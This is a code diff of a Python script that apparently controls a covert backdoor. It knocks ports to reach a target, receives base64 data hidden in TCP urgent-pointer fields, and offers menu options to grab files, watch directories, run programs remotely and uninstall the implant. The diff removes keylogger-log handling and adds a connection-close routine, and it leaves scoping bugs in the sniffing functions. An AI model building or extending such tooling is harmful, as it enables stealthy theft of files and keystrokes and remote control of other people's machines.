@@ -80,15 +80,6 @@ def uninstall():
     print("Uninstall signal sent.")
     sys.exit(0)
 
-def handle_received_data(decoded_data):
-    """Handle the received data."""
-    global current_signal
-    print(f"Signal: {current_signal}")
-    if current_signal == "KL_STOP":
-        save_log_file(decoded_data)
-    elif current_signal == "FT":
-        save_file(decoded_data)
-
 def packet_callback(packet):
     """Callback function to process each sniffed packet."""
     global received_data
@@ -106,21 +97,19 @@ def packet_callback(packet):
             print(f"Decoded Data: {decoded_data}")
             if urgent_pointer_value == eof_signal:
                 print("EOF signal detected.")
-                handle_received_data(decoded_data)
+                save_file(decoded_data)
                 received_data = ""  # Reset received_data after handling
         except (UnicodeDecodeError, base64.binascii.Error) as e:
             print(f"Decoding error: {e}")
 
 def start_sniffing():
     """Start sniffing for packets."""
-    global sniffing
-    if not sniffing:
-        sniffing = True
-        sniffing_event.clear()
-        local_ip = get_local_ip()
-        print("Waiting for signal...")
-        sniff_thread = threading.Thread(target=sniff_packets, args=(local_ip,))
-        sniff_thread.start()
+    sniffing = True
+    sniffing_event.clear()
+    local_ip = get_local_ip()
+    print("Waiting for signal...")
+    sniff_thread = threading.Thread(target=sniff_packets, args=(local_ip,))
+    sniff_thread.start()
 
 def sniff_packets(local_ip):
     """Sniff packets in a separate thread."""
@@ -129,17 +118,10 @@ def sniff_packets(local_ip):
 def stop_sniffing():
     """Stop sniffing for packets."""
     # forcefully stop sniffing
-    global sniffing
-    sniffing = False
-    sniffing_event.set()  # Set the event to stop sniffing
-    sniff(iface=None, prn=lambda x: None, store=0)  # Dummy sniff to stop the previous one    
-    print("Sniffing stopped.")
-
-def save_log_file(encoded_data):
-    """Save the log file from the encoded data."""
-    save_file(encoded_data)
-    stop_sniffing()
-    sys.exit(0)
+    if sniffing:
+        sniffing_event.set()
+        sniffing = False
+        print("Sniffing stopped.")
 
 def save_file(encoded_data):
     """Save the file from the encoded data."""
@@ -206,7 +188,6 @@ def send_knock_sequence(dest_ip, sequence):
     for port in sequence:
         port = int(port)
         send_packet(dest_ip, port)
-        time.sleep(1)
     
     print("Waiting for acknowledgment...")
     # Wait for acknowledgment with timeout
@@ -215,6 +196,14 @@ def send_knock_sequence(dest_ip, sequence):
     else:
         print("No acknowledgment received. Exiting.")
         sys.exit(1)
+    
+def close_connection():
+    """Close the connection by sending a FIN packet."""
+    global current_signal
+    current_signal = "CLOSE"
+    send_signal("CLOSE")
+    print("Connection closed.")
+    sys.exit(0)
 
 def send_packet(dest_ip, port):
     """Send a TCP packet to the specified port."""
@@ -262,7 +251,7 @@ def main():
         "4": lambda: start_file_grabber(input("Enter the file path to receive: ")),
         "5": lambda: start_watcher(input("Enter the file or directory to watch: ")),
         "6": lambda: start_runner(input("Enter the program to run: ")),
-        "7": lambda: sys.exit(0),
+        "7": lambda: close_connection(),
         "8": lambda: uninstall(),
     }
     while True:
